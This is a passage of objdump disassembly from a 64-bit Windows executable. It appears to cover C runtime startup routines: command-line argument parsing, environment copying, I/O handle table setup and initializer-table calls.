   140002dd4:	e9 f6 fe ff ff       	jmp    0x140002ccf
   140002dd9:	cc                   	int3
   140002dda:	cc                   	int3
   140002ddb:	cc                   	int3
   140002ddc:	48 8b c4             	mov    %rsp,%rax
   140002ddf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140002de3:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140002de7:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140002deb:	4c 89 68 20          	mov    %r13,0x20(%rax)
   140002def:	41 56                	push   %r14
   140002df1:	4c 8b 5c 24 30       	mov    0x30(%rsp),%r11
   140002df6:	33 f6                	xor    %esi,%esi
   140002df8:	49 8b d9             	mov    %r9,%rbx
   140002dfb:	41 89 33             	mov    %esi,(%r11)
   140002dfe:	4c 8b d2             	mov    %rdx,%r10
   140002e01:	41 c7 01 01 00 00 00 	movl   $0x1,(%r9)
   140002e08:	48 85 d2             	test   %rdx,%rdx
   140002e0b:	74 07                	je     0x140002e14
   140002e0d:	4c 89 02             	mov    %r8,(%rdx)
   140002e10:	49 83 c2 08          	add    $0x8,%r10
   140002e14:	8b d6                	mov    %esi,%edx
   140002e16:	41 be 22 00 00 00    	mov    $0x22,%r14d
   140002e1c:	66 44 39 31          	cmp    %r14w,(%rcx)
   140002e20:	75 13                	jne    0x140002e35
   140002e22:	85 d2                	test   %edx,%edx
   140002e24:	8b c6                	mov    %esi,%eax
   140002e26:	0f 94 c0             	sete   %al
   140002e29:	48 83 c1 02          	add    $0x2,%rcx
   140002e2d:	8b d0                	mov    %eax,%edx
   140002e2f:	41 0f b7 c6          	movzwl %r14w,%eax
   140002e33:	eb 1f                	jmp    0x140002e54
   140002e35:	41 ff 03             	incl   (%r11)
   140002e38:	4d 85 c0             	test   %r8,%r8
   140002e3b:	74 0b                	je     0x140002e48
   140002e3d:	0f b7 01             	movzwl (%rcx),%eax
   140002e40:	66 41 89 00          	mov    %ax,(%r8)
   140002e44:	49 83 c0 02          	add    $0x2,%r8
   140002e48:	0f b7 01             	movzwl (%rcx),%eax
   140002e4b:	48 83 c1 02          	add    $0x2,%rcx
   140002e4f:	66 85 c0             	test   %ax,%ax
   140002e52:	74 1c                	je     0x140002e70
   140002e54:	85 d2                	test   %edx,%edx
   140002e56:	75 c4                	jne    0x140002e1c
   140002e58:	66 83 f8 20          	cmp    $0x20,%ax
   140002e5c:	74 06                	je     0x140002e64
   140002e5e:	66 83 f8 09          	cmp    $0x9,%ax
   140002e62:	75 b8                	jne    0x140002e1c
   140002e64:	4d 85 c0             	test   %r8,%r8
   140002e67:	74 0b                	je     0x140002e74
   140002e69:	66 41 89 70 fe       	mov    %si,-0x2(%r8)
   140002e6e:	eb 04                	jmp    0x140002e74
   140002e70:	48 83 e9 02          	sub    $0x2,%rcx
   140002e74:	8b fe                	mov    %esi,%edi
   140002e76:	41 bd 5c 00 00 00    	mov    $0x5c,%r13d
   140002e7c:	66 39 31             	cmp    %si,(%rcx)
   140002e7f:	0f 84 ce 00 00 00    	je     0x140002f53
   140002e85:	66 83 39 20          	cmpw   $0x20,(%rcx)
   140002e89:	74 06                	je     0x140002e91
   140002e8b:	66 83 39 09          	cmpw   $0x9,(%rcx)
   140002e8f:	75 06                	jne    0x140002e97
   140002e91:	48 83 c1 02          	add    $0x2,%rcx
   140002e95:	eb ee                	jmp    0x140002e85
   140002e97:	66 39 31             	cmp    %si,(%rcx)
   140002e9a:	0f 84 b3 00 00 00    	je     0x140002f53
   140002ea0:	4d 85 d2             	test   %r10,%r10
   140002ea3:	74 07                	je     0x140002eac
   140002ea5:	4d 89 02             	mov    %r8,(%r10)
   140002ea8:	49 83 c2 08          	add    $0x8,%r10
   140002eac:	ff 03                	incl   (%rbx)
   140002eae:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002eb4:	8b d6                	mov    %esi,%edx
   140002eb6:	eb 06                	jmp    0x140002ebe
   140002eb8:	48 83 c1 02          	add    $0x2,%rcx
   140002ebc:	ff c2                	inc    %edx
   140002ebe:	66 44 39 29          	cmp    %r13w,(%rcx)
   140002ec2:	74 f4                	je     0x140002eb8
   140002ec4:	66 44 39 31          	cmp    %r14w,(%rcx)
   140002ec8:	75 3a                	jne    0x140002f04
   140002eca:	41 84 d1             	test   %dl,%r9b
   140002ecd:	75 1f                	jne    0x140002eee
   140002ecf:	85 ff                	test   %edi,%edi
   140002ed1:	74 0f                	je     0x140002ee2
   140002ed3:	48 8d 41 02          	lea    0x2(%rcx),%rax
   140002ed7:	66 44 39 30          	cmp    %r14w,(%rax)
   140002edb:	75 05                	jne    0x140002ee2
   140002edd:	48 8b c8             	mov    %rax,%rcx
   140002ee0:	eb 0c                	jmp    0x140002eee
   140002ee2:	85 ff                	test   %edi,%edi
   140002ee4:	8b c6                	mov    %esi,%eax
   140002ee6:	44 8b ce             	mov    %esi,%r9d
   140002ee9:	0f 94 c0             	sete   %al
   140002eec:	8b f8                	mov    %eax,%edi
   140002eee:	d1 ea                	shr    $1,%edx
   140002ef0:	eb 12                	jmp    0x140002f04
   140002ef2:	ff ca                	dec    %edx
   140002ef4:	4d 85 c0             	test   %r8,%r8
   140002ef7:	74 08                	je     0x140002f01
   140002ef9:	66 45 89 28          	mov    %r13w,(%r8)
   140002efd:	49 83 c0 02          	add    $0x2,%r8
   140002f01:	41 ff 03             	incl   (%r11)
   140002f04:	85 d2                	test   %edx,%edx
   140002f06:	75 ea                	jne    0x140002ef2
   140002f08:	0f b7 01             	movzwl (%rcx),%eax
   140002f0b:	66 85 c0             	test   %ax,%ax
   140002f0e:	74 2e                	je     0x140002f3e
   140002f10:	85 ff                	test   %edi,%edi
   140002f12:	75 0c                	jne    0x140002f20
   140002f14:	66 83 f8 20          	cmp    $0x20,%ax
   140002f18:	74 24                	je     0x140002f3e
   140002f1a:	66 83 f8 09          	cmp    $0x9,%ax
   140002f1e:	74 1e                	je     0x140002f3e
   140002f20:	45 85 c9             	test   %r9d,%r9d
   140002f23:	74 10                	je     0x140002f35
   140002f25:	4d 85 c0             	test   %r8,%r8
   140002f28:	74 08                	je     0x140002f32
   140002f2a:	66 41 89 00          	mov    %ax,(%r8)
   140002f2e:	49 83 c0 02          	add    $0x2,%r8
   140002f32:	41 ff 03             	incl   (%r11)
   140002f35:	48 83 c1 02          	add    $0x2,%rcx
   140002f39:	e9 70 ff ff ff       	jmp    0x140002eae
   140002f3e:	4d 85 c0             	test   %r8,%r8
   140002f41:	74 08                	je     0x140002f4b
   140002f43:	66 41 89 30          	mov    %si,(%r8)
   140002f47:	49 83 c0 02          	add    $0x2,%r8
   140002f4b:	41 ff 03             	incl   (%r11)
   140002f4e:	e9 29 ff ff ff       	jmp    0x140002e7c
   140002f53:	4d 85 d2             	test   %r10,%r10
   140002f56:	74 03                	je     0x140002f5b
   140002f58:	49 89 32             	mov    %rsi,(%r10)
   140002f5b:	ff 03                	incl   (%rbx)
   140002f5d:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140002f62:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140002f67:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140002f6c:	4c 8b 6c 24 28       	mov    0x28(%rsp),%r13
   140002f71:	41 5e                	pop    %r14
   140002f73:	c3                   	ret
   140002f74:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002f79:	55                   	push   %rbp
   140002f7a:	56                   	push   %rsi
   140002f7b:	57                   	push   %rdi
   140002f7c:	48 83 ec 30          	sub    $0x30,%rsp
   140002f80:	48 8d 3d 89 97 00 00 	lea    0x9789(%rip),%rdi        # 0x14000c710
   140002f87:	33 ed                	xor    %ebp,%ebp
   140002f89:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002f8f:	48 8b d7             	mov    %rdi,%rdx
   140002f92:	33 c9                	xor    %ecx,%ecx
   140002f94:	66 89 2d 7d 99 00 00 	mov    %bp,0x997d(%rip)        # 0x14000c918
   140002f9b:	ff 15 37 51 00 00    	call   *0x5137(%rip)        # 0x1400080d8
   140002fa1:	48 8b 1d 30 a4 00 00 	mov    0xa430(%rip),%rbx        # 0x14000d3d8
   140002fa8:	48 89 3d 09 91 00 00 	mov    %rdi,0x9109(%rip)        # 0x14000c0b8
   140002faf:	48 85 db             	test   %rbx,%rbx
   140002fb2:	74 05                	je     0x140002fb9
   140002fb4:	66 39 2b             	cmp    %bp,(%rbx)
   140002fb7:	75 03                	jne    0x140002fbc
   140002fb9:	48 8b df             	mov    %rdi,%rbx
   140002fbc:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140002fc1:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140002fc6:	45 33 c0             	xor    %r8d,%r8d
   140002fc9:	33 d2                	xor    %edx,%edx
   140002fcb:	48 8b cb             	mov    %rbx,%rcx
   140002fce:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002fd3:	e8 04 fe ff ff       	call   0x140002ddc
   140002fd8:	48 63 74 24 50       	movslq 0x50(%rsp),%rsi
   140002fdd:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   140002fe4:	ff ff 1f 
   140002fe7:	48 3b f0             	cmp    %rax,%rsi
   140002fea:	73 68                	jae    0x140003054
   140002fec:	48 63 44 24 58       	movslq 0x58(%rsp),%rax
   140002ff1:	48 b9 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rcx
   140002ff8:	ff ff 7f 
   140002ffb:	48 3b c1             	cmp    %rcx,%rax
   140002ffe:	73 54                	jae    0x140003054
   140003000:	48 8d 0c b0          	lea    (%rax,%rsi,4),%rcx
   140003004:	48 03 c0             	add    %rax,%rax
   140003007:	48 03 c9             	add    %rcx,%rcx
   14000300a:	48 3b c8             	cmp    %rax,%rcx
   14000300d:	72 45                	jb     0x140003054
   14000300f:	e8 b0 17 00 00       	call   0x1400047c4
   140003014:	48 8b f8             	mov    %rax,%rdi
   140003017:	48 85 c0             	test   %rax,%rax
   14000301a:	74 38                	je     0x140003054
   14000301c:	4c 8d 04 f0          	lea    (%rax,%rsi,8),%r8
   140003020:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140003025:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000302a:	48 8b d7             	mov    %rdi,%rdx
   14000302d:	48 8b cb             	mov    %rbx,%rcx
   140003030:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003035:	e8 a2 fd ff ff       	call   0x140002ddc
   14000303a:	44 8b 5c 24 50       	mov    0x50(%rsp),%r11d
   14000303f:	48 89 3d 42 90 00 00 	mov    %rdi,0x9042(%rip)        # 0x14000c088
   140003046:	41 ff cb             	dec    %r11d
   140003049:	33 c0                	xor    %eax,%eax
   14000304b:	44 89 1d 2a 90 00 00 	mov    %r11d,0x902a(%rip)        # 0x14000c07c
   140003052:	eb 03                	jmp    0x140003057
   140003054:	83 c8 ff             	or     $0xffffffff,%eax
   140003057:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000305c:	48 83 c4 30          	add    $0x30,%rsp
   140003060:	5f                   	pop    %rdi
   140003061:	5e                   	pop    %rsi
   140003062:	5d                   	pop    %rbp
   140003063:	c3                   	ret
   140003064:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003069:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000306e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003073:	57                   	push   %rdi
   140003074:	48 83 ec 20          	sub    $0x20,%rsp
   140003078:	ff 15 1a 51 00 00    	call   *0x511a(%rip)        # 0x140008198
   14000307e:	33 db                	xor    %ebx,%ebx
   140003080:	48 8b f8             	mov    %rax,%rdi
   140003083:	48 85 c0             	test   %rax,%rax
   140003086:	74 4c                	je     0x1400030d4
   140003088:	66 39 1f             	cmp    %bx,(%rdi)
   14000308b:	74 12                	je     0x14000309f
   14000308d:	48 83 c0 02          	add    $0x2,%rax
   140003091:	66 39 18             	cmp    %bx,(%rax)
   140003094:	75 f7                	jne    0x14000308d
   140003096:	48 83 c0 02          	add    $0x2,%rax
   14000309a:	66 39 18             	cmp    %bx,(%rax)
   14000309d:	75 ee                	jne    0x14000308d
   14000309f:	2b c7                	sub    %edi,%eax
   1400030a1:	83 c0 02             	add    $0x2,%eax
   1400030a4:	48 63 e8             	movslq %eax,%rbp
   1400030a7:	48 8b cd             	mov    %rbp,%rcx
   1400030aa:	e8 15 17 00 00       	call   0x1400047c4
   1400030af:	48 8b f0             	mov    %rax,%rsi
   1400030b2:	48 85 c0             	test   %rax,%rax
   1400030b5:	74 11                	je     0x1400030c8
   1400030b7:	4c 8b c5             	mov    %rbp,%r8
   1400030ba:	48 8b d7             	mov    %rdi,%rdx
   1400030bd:	48 8b c8             	mov    %rax,%rcx
   1400030c0:	e8 9b 18 00 00       	call   0x140004960
   1400030c5:	48 8b de             	mov    %rsi,%rbx
   1400030c8:	48 8b cf             	mov    %rdi,%rcx
   1400030cb:	ff 15 bf 50 00 00    	call   *0x50bf(%rip)        # 0x140008190
   1400030d1:	48 8b c3             	mov    %rbx,%rax
   1400030d4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400030d9:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400030de:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400030e3:	48 83 c4 20          	add    $0x20,%rsp
   1400030e7:	5f                   	pop    %rdi
   1400030e8:	c3                   	ret
   1400030e9:	cc                   	int3
   1400030ea:	cc                   	int3
   1400030eb:	cc                   	int3
   1400030ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400030f1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400030f6:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400030fb:	41 54                	push   %r12
   1400030fd:	41 55                	push   %r13
   1400030ff:	41 56                	push   %r14
   140003101:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140003108:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000310d:	ff 15 2d 50 00 00    	call   *0x502d(%rip)        # 0x140008140
   140003113:	ba 58 00 00 00       	mov    $0x58,%edx
   140003118:	8d 6a c8             	lea    -0x38(%rdx),%ebp
   14000311b:	8b cd                	mov    %ebp,%ecx
   14000311d:	e8 22 17 00 00       	call   0x140004844
   140003122:	45 33 f6             	xor    %r14d,%r14d
   140003125:	48 8b d0             	mov    %rax,%rdx
   140003128:	48 85 c0             	test   %rax,%rax
   14000312b:	75 08                	jne    0x140003135
   14000312d:	83 c8 ff             	or     $0xffffffff,%eax
   140003130:	e9 6b 02 00 00       	jmp    0x1400033a0
   140003135:	48 89 05 64 a0 00 00 	mov    %rax,0xa064(%rip)        # 0x14000d1a0
   14000313c:	48 05 00 0b 00 00    	add    $0xb00,%rax
   140003142:	8b cd                	mov    %ebp,%ecx
   140003144:	89 0d 3a a0 00 00    	mov    %ecx,0xa03a(%rip)        # 0x14000d184
   14000314a:	48 3b d0             	cmp    %rax,%rdx
   14000314d:	73 45                	jae    0x140003194
   14000314f:	48 83 c2 09          	add    $0x9,%rdx
   140003153:	48 83 4a f7 ff       	orq    $0xffffffffffffffff,-0x9(%rdx)
   140003158:	66 c7 42 ff 00 0a    	movw   $0xa00,-0x1(%rdx)
   14000315e:	44 89 72 03          	mov    %r14d,0x3(%rdx)
   140003162:	66 c7 42 2f 00 0a    	movw   $0xa00,0x2f(%rdx)
   140003168:	c6 42 31 0a          	movb   $0xa,0x31(%rdx)
   14000316c:	44 89 72 47          	mov    %r14d,0x47(%rdx)
   140003170:	44 88 72 43          	mov    %r14b,0x43(%rdx)
   140003174:	48 8b 05 25 a0 00 00 	mov    0xa025(%rip),%rax        # 0x14000d1a0
   14000317b:	48 83 c2 58          	add    $0x58,%rdx
   14000317f:	48 8d 4a f7          	lea    -0x9(%rdx),%rcx
   140003183:	48 05 00 0b 00 00    	add    $0xb00,%rax
   140003189:	48 3b c8             	cmp    %rax,%rcx
   14000318c:	72 c5                	jb     0x140003153
   14000318e:	8b 0d f0 9f 00 00    	mov    0x9ff0(%rip),%ecx        # 0x14000d184
   140003194:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   14000319a:	0f 84 34 01 00 00    	je     0x1400032d4
   1400031a0:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   1400031a5:	48 85 c0             	test   %rax,%rax
   1400031a8:	0f 84 26 01 00 00    	je     0x1400032d4
   1400031ae:	4c 63 20             	movslq (%rax),%r12
   1400031b1:	bb 00 08 00 00       	mov    $0x800,%ebx
   1400031b6:	4c 8d 68 04          	lea    0x4(%rax),%r13
   1400031ba:	4d 03 e5             	add    %r13,%r12
   1400031bd:	39 18                	cmp    %ebx,(%rax)
   1400031bf:	0f 4c 18             	cmovl  (%rax),%ebx
   1400031c2:	3b cb                	cmp    %ebx,%ecx
   1400031c4:	0f 8d 87 00 00 00    	jge    0x140003251
   1400031ca:	48 8d 3d d7 9f 00 00 	lea    0x9fd7(%rip),%rdi        # 0x14000d1a8
   1400031d1:	ba 58 00 00 00       	mov    $0x58,%edx
   1400031d6:	48 8b cd             	mov    %rbp,%rcx
   1400031d9:	e8 66 16 00 00       	call   0x140004844
   1400031de:	48 85 c0             	test   %rax,%rax
   1400031e1:	74 68                	je     0x14000324b
   1400031e3:	8b 15 9b 9f 00 00    	mov    0x9f9b(%rip),%edx        # 0x14000d184
   1400031e9:	48 8d 88 00 0b 00 00 	lea    0xb00(%rax),%rcx
   1400031f0:	48 89 07             	mov    %rax,(%rdi)
   1400031f3:	03 d5                	add    %ebp,%edx
   1400031f5:	89 15 89 9f 00 00    	mov    %edx,0x9f89(%rip)        # 0x14000d184
   1400031fb:	48 3b c1             	cmp    %rcx,%rax
   1400031fe:	73 41                	jae    0x140003241
   140003200:	48 8d 50 09          	lea    0x9(%rax),%rdx
   140003204:	48 83 4a f7 ff       	orq    $0xffffffffffffffff,-0x9(%rdx)
   140003209:	80 62 2f 80          	andb   $0x80,0x2f(%rdx)
   14000320d:	66 c7 42 ff 00 0a    	movw   $0xa00,-0x1(%rdx)
   140003213:	44 89 72 03          	mov    %r14d,0x3(%rdx)
   140003217:	66 c7 42 30 0a 0a    	movw   $0xa0a,0x30(%rdx)
   14000321d:	44 89 72 47          	mov    %r14d,0x47(%rdx)
   140003221:	44 88 72 43          	mov    %r14b,0x43(%rdx)
   140003225:	48 8b 07             	mov    (%rdi),%rax
   140003228:	48 83 c2 58          	add    $0x58,%rdx
   14000322c:	48 8d 4a f7          	lea    -0x9(%rdx),%rcx
   140003230:	48 05 00 0b 00 00    	add    $0xb00,%rax
   140003236:	48 3b c8             	cmp    %rax,%rcx
   140003239:	72 c9                	jb     0x140003204
   14000323b:	8b 15 43 9f 00 00    	mov    0x9f43(%rip),%edx        # 0x14000d184
   140003241:	48 83 c7 08          	add    $0x8,%rdi
   140003245:	3b d3                	cmp    %ebx,%edx
   140003247:	7c 88                	jl     0x1400031d1
   140003249:	eb 06                	jmp    0x140003251
   14000324b:	8b 1d 33 9f 00 00    	mov    0x9f33(%rip),%ebx        # 0x14000d184
   140003251:	41 8b fe             	mov    %r14d,%edi
   140003254:	85 db                	test   %ebx,%ebx
   140003256:	7e 7c                	jle    0x1400032d4
   140003258:	49 83 3c 24 ff       	cmpq   $0xffffffffffffffff,(%r12)
   14000325d:	74 68                	je     0x1400032c7
   14000325f:	49 83 3c 24 fe       	cmpq   $0xfffffffffffffffe,(%r12)
   140003264:	74 61                	je     0x1400032c7
   140003266:	41 f6 45 00 01       	testb  $0x1,0x0(%r13)
   14000326b:	74 5a                	je     0x1400032c7
   14000326d:	41 f6 45 00 08       	testb  $0x8,0x0(%r13)
   140003272:	75 0e                	jne    0x140003282
   140003274:	49 8b 0c 24          	mov    (%r12),%rcx
   140003278:	ff 15 32 4f 00 00    	call   *0x4f32(%rip)        # 0x1400081b0
   14000327e:	85 c0                	test   %eax,%eax
   140003280:	74 45                	je     0x1400032c7
   140003282:	48 63 ef             	movslq %edi,%rbp
   140003285:	48 8d 0d 14 9f 00 00 	lea    0x9f14(%rip),%rcx        # 0x14000d1a0
   14000328c:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140003291:	48 8b c5             	mov    %rbp,%rax
   140003294:	83 e5 1f             	and    $0x1f,%ebp
   140003297:	48 c1 f8 05          	sar    $0x5,%rax
   14000329b:	48 6b ed 58          	imul   $0x58,%rbp,%rbp
   14000329f:	48 03 2c c1          	add    (%rcx,%rax,8),%rbp
   1400032a3:	49 8b 04 24          	mov    (%r12),%rax
   1400032a7:	48 89 45 00          	mov    %rax,0x0(%rbp)
   1400032ab:	41 8a 45 00          	mov    0x0(%r13),%al
   1400032af:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400032b3:	88 45 08             	mov    %al,0x8(%rbp)
   1400032b6:	ff 15 ec 4e 00 00    	call   *0x4eec(%rip)        # 0x1400081a8
   1400032bc:	85 c0                	test   %eax,%eax
   1400032be:	0f 84 69 fe ff ff    	je     0x14000312d
   1400032c4:	ff 45 0c             	incl   0xc(%rbp)
   1400032c7:	ff c7                	inc    %edi
   1400032c9:	49 ff c5             	inc    %r13
   1400032cc:	49 83 c4 08          	add    $0x8,%r12
   1400032d0:	3b fb                	cmp    %ebx,%edi
   1400032d2:	7c 84                	jl     0x140003258
   1400032d4:	45 8b e6             	mov    %r14d,%r12d
   1400032d7:	49 8b de             	mov    %r14,%rbx
   1400032da:	48 8b 3d bf 9e 00 00 	mov    0x9ebf(%rip),%rdi        # 0x14000d1a0
   1400032e1:	48 83 3c 3b ff       	cmpq   $0xffffffffffffffff,(%rbx,%rdi,1)
   1400032e6:	74 11                	je     0x1400032f9
   1400032e8:	48 83 3c 3b fe       	cmpq   $0xfffffffffffffffe,(%rbx,%rdi,1)
   1400032ed:	74 0a                	je     0x1400032f9
   1400032ef:	80 4c 3b 08 80       	orb    $0x80,0x8(%rbx,%rdi,1)
   1400032f4:	e9 85 00 00 00       	jmp    0x14000337e
   1400032f9:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   1400032fe:	c6 44 3b 08 81       	movb   $0x81,0x8(%rbx,%rdi,1)
   140003303:	f7 d8                	neg    %eax
   140003305:	b8 f6 ff ff ff       	mov    $0xfffffff6,%eax
   14000330a:	1b c9                	sbb    %ecx,%ecx
   14000330c:	83 c1 f5             	add    $0xfffffff5,%ecx
   14000330f:	45 85 e4             	test   %r12d,%r12d
   140003312:	0f 44 c8             	cmove  %eax,%ecx
   140003315:	ff 15 5d 4e 00 00    	call   *0x4e5d(%rip)        # 0x140008178
   14000331b:	48 8b e8             	mov    %rax,%rbp
   14000331e:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003322:	74 4d                	je     0x140003371
   140003324:	48 85 c0             	test   %rax,%rax
   140003327:	74 48                	je     0x140003371
   140003329:	48 8b c8             	mov    %rax,%rcx
   14000332c:	ff 15 7e 4e 00 00    	call   *0x4e7e(%rip)        # 0x1400081b0
   140003332:	85 c0                	test   %eax,%eax
   140003334:	74 3b                	je     0x140003371
   140003336:	0f b6 c0             	movzbl %al,%eax
   140003339:	48 89 2c 3b          	mov    %rbp,(%rbx,%rdi,1)
   14000333d:	83 f8 02             	cmp    $0x2,%eax
   140003340:	75 07                	jne    0x140003349
   140003342:	80 4c 3b 08 40       	orb    $0x40,0x8(%rbx,%rdi,1)
   140003347:	eb 0a                	jmp    0x140003353
   140003349:	83 f8 03             	cmp    $0x3,%eax
   14000334c:	75 05                	jne    0x140003353
   14000334e:	80 4c 3b 08 08       	orb    $0x8,0x8(%rbx,%rdi,1)
   140003353:	48 8d 4c 3b 10       	lea    0x10(%rbx,%rdi,1),%rcx
   140003358:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   14000335d:	ff 15 45 4e 00 00    	call   *0x4e45(%rip)        # 0x1400081a8
   140003363:	85 c0                	test   %eax,%eax
   140003365:	0f 84 c2 fd ff ff    	je     0x14000312d
   14000336b:	ff 44 3b 0c          	incl   0xc(%rbx,%rdi,1)
   14000336f:	eb 0d                	jmp    0x14000337e
   140003371:	80 4c 3b 08 40       	orb    $0x40,0x8(%rbx,%rdi,1)
   140003376:	48 c7 04 3b fe ff ff 	movq   $0xfffffffffffffffe,(%rbx,%rdi,1)
   14000337d:	ff 
   14000337e:	48 83 c3 58          	add    $0x58,%rbx
   140003382:	41 ff c4             	inc    %r12d
   140003385:	48 81 fb 08 01 00 00 	cmp    $0x108,%rbx
   14000338c:	0f 8c 48 ff ff ff    	jl     0x1400032da
   140003392:	8b 0d ec 9d 00 00    	mov    0x9dec(%rip),%ecx        # 0x14000d184
   140003398:	ff 15 02 4e 00 00    	call   *0x4e02(%rip)        # 0x1400081a0
   14000339e:	33 c0                	xor    %eax,%eax
   1400033a0:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   1400033a7:	00 
   1400033a8:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400033ac:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   1400033b0:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   1400033b4:	49 8b e3             	mov    %r11,%rsp
   1400033b7:	41 5e                	pop    %r14
   1400033b9:	41 5d                	pop    %r13
   1400033bb:	41 5c                	pop    %r12
   1400033bd:	c3                   	ret
   1400033be:	cc                   	int3
   1400033bf:	cc                   	int3
   1400033c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400033c5:	57                   	push   %rdi
   1400033c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400033ca:	48 8d 1d 7f 6a 00 00 	lea    0x6a7f(%rip),%rbx        # 0x140009e50
   1400033d1:	48 8d 3d 78 6a 00 00 	lea    0x6a78(%rip),%rdi        # 0x140009e50
   1400033d8:	eb 0e                	jmp    0x1400033e8
   1400033da:	48 8b 03             	mov    (%rbx),%rax
   1400033dd:	48 85 c0             	test   %rax,%rax
   1400033e0:	74 02                	je     0x1400033e4
   1400033e2:	ff d0                	call   *%rax
   1400033e4:	48 83 c3 08          	add    $0x8,%rbx
   1400033e8:	48 3b df             	cmp    %rdi,%rbx
   1400033eb:	72 ed                	jb     0x1400033da
   1400033ed:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400033f2:	48 83 c4 20          	add    $0x20,%rsp
   1400033f6:	5f                   	pop    %rdi
   1400033f7:	c3                   	ret
   1400033f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400033fd:	57                   	push   %rdi
   1400033fe:	48 83 ec 20          	sub    $0x20,%rsp
   140003402:	48 8d 1d 57 6a 00 00 	lea    0x6a57(%rip),%rbx        # 0x140009e60
   140003409:	48 8d 3d 50 6a 00 00 	lea    0x6a50(%rip),%rdi        # 0x140009e60
   140003410:	eb 0e                	jmp    0x140003420
   140003412:	48 8b 03             	mov    (%rbx),%rax
   140003415:	48 85 c0             	test   %rax,%rax
   140003418:	74 02                	je     0x14000341c
   14000341a:	ff d0                	call   *%rax
   14000341c:	48 83 c3 08          	add    $0x8,%rbx
   140003420:	48 3b df             	cmp    %rdi,%rbx
   140003423:	72 ed                	jb     0x140003412
   140003425:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000342a:	48 83 c4 20          	add    $0x20,%rsp
   14000342e:	5f                   	pop    %rdi
   14000342f:	c3                   	ret
   140003430:	33 c9                	xor    %ecx,%ecx
   140003432:	48 ff 25 47 4d 00 00 	rex.W jmp *0x4d47(%rip)        # 0x140008180
   140003439:	cc                   	int3
   14000343a:	cc                   	int3
   14000343b:	cc                   	int3
   14000343c:	48 83 ec 28          	sub    $0x28,%rsp
   140003440:	8b 0d 92 7d 00 00    	mov    0x7d92(%rip),%ecx        # 0x14000b1d8
   140003446:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140003449:	74 0d                	je     0x140003458
   14000344b:	ff 15 7f 4d 00 00    	call   *0x4d7f(%rip)        # 0x1400081d0
   140003451:	83 0d 80 7d 00 00 ff 	orl    $0xffffffff,0x7d80(%rip)        # 0x14000b1d8
   140003458:	48 83 c4 28          	add    $0x28,%rsp
   14000345c:	e9 6b 06 00 00       	jmp    0x140003acc
   140003461:	cc                   	int3
   140003462:	cc                   	int3
   140003463:	cc                   	int3
   140003464:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003469:	57                   	push   %rdi
   14000346a:	48 83 ec 20          	sub    $0x20,%rsp
   14000346e:	48 8b fa             	mov    %rdx,%rdi
   140003471:	48 8b d9             	mov    %rcx,%rbx
   140003474:	48 8d 05 95 5a 00 00 	lea    0x5a95(%rip),%rax        # 0x140008f10
   14000347b:	48 89 81 a0 00 00 00 	mov    %rax,0xa0(%rcx)
   140003482:	83 61 10 00          	andl   $0x0,0x10(%rcx)
   140003486:	c7 41 1c 01 00 00 00 	movl   $0x1,0x1c(%rcx)
   14000348d:	c7 81 c8 00 00 00 01 	movl   $0x1,0xc8(%rcx)
   140003494:	00 00 00 
   140003497:	c6 81 74 01 00 00 43 	movb   $0x43,0x174(%rcx)
   14000349e:	c6 81 f7 01 00 00 43 	movb   $0x43,0x1f7(%rcx)
   1400034a5:	48 8d 05 14 84 00 00 	lea    0x8414(%rip),%rax        # 0x14000b8c0
   1400034ac:	48 89 81 b8 00 00 00 	mov    %rax,0xb8(%rcx)
   1400034b3:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1400034b8:	e8 97 07 00 00       	call   0x140003c54
   1400034bd:	90                   	nop
   1400034be:	48 8b 83 b8 00 00 00 	mov    0xb8(%rbx),%rax
   1400034c5:	f0 ff 00             	lock incl (%rax)
   1400034c8:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1400034cd:	e8 82 06 00 00       	call   0x140003b54
